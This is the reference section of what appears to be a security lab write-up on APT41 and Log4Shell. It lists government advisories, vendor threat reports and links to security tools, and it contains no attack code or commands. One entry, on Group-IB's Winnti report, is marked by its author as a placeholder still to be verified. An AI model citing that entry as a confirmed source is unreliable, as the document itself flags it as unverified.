*Lab repository: [github.com/anpa1200/dragonrx-lab](https://github.com/anpa1200/dragonrx-lab)*

---

## References

<a id="ref-1"></a>
1. US Department of Justice, "Seven International Cyber Defendants, Including 'APT41' Actors, Charged in Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally," September 16, 2020. [https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer)

<a id="ref-2"></a>
2. Mandiant, "Double Dragon: APT41, a Dual Espionage and Cyber Crime Operation," August 2019. [https://www.mandiant.com/resources/reports/apt41-dual-espionage-and-cyber-crime-operation](https://www.mandiant.com/resources/reports/apt41-dual-espionage-and-cyber-crime-operation)

<a id="ref-3"></a>
3. Mandiant, "APT41 Intrusion Into US State Government Computer Networks," March 2022. [https://www.mandiant.com/resources/blog/apt41-us-state-governments](https://www.mandiant.com/resources/blog/apt41-us-state-governments) *(Documents Log4j exploitation within hours of disclosure)*

<a id="ref-4"></a>
4. CISA et al., "AA21-356A: Mitigating Log4Shell and Other Log4j-Related Vulnerabilities," December 22, 2021. [https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a)

<a id="ref-5"></a>
5. MITRE ATT&CK, "APT41 Group G0096." [https://attack.mitre.org/groups/G0096/](https://attack.mitre.org/groups/G0096/)

<a id="ref-6"></a>
6. Group-IB, "Big Game Hunting: The Winnti Group," 2020. [Placeholder — verify exact publication title and URL against Group-IB public reports portal at https://www.group-ib.com/resources/research/]

<a id="ref-7"></a>
7. Recorded Future, Insikt Group, "Chinese State-Sponsored Group TAG-22 Targets Nepal, the Philippines, and Taiwan Using Winnti and Shadowpad Backdoors," 2021. [https://www.recordedfuture.com/chinese-state-sponsored-group-tag-22-targets-nepal-philippines-taiwan](https://www.recordedfuture.com/chinese-state-sponsored-group-tag-22-targets-nepal-philippines-taiwan)

<a id="ref-8"></a>
8. Mandiant, M-Trends 2024, "Special Report: Global Investigation Trends." [https://www.mandiant.com/m-trends](https://www.mandiant.com/m-trends)

<a id="ref-9"></a>
9. Apache Log4j Security Vulnerabilities — CVE-2021-44228. National Vulnerability Database, NIST. [https://nvd.nist.gov/vuln/detail/CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

<a id="ref-10"></a>
10. Impacket, Fortra (SecureAuth). [https://github.com/fortra/impacket](https://github.com/fortra/impacket)

<a id="ref-11"></a>
11. BloodHound, SpecterOps. [https://github.com/BloodHoundAD/BloodHound](https://github.com/BloodHoundAD/BloodHound)

<a id="ref-12"></a>
12. Volatility3, Volatility Foundation. [https://github.com/volatilityfoundation/volatility3](https://github.com/volatilityfoundation/volatility3)
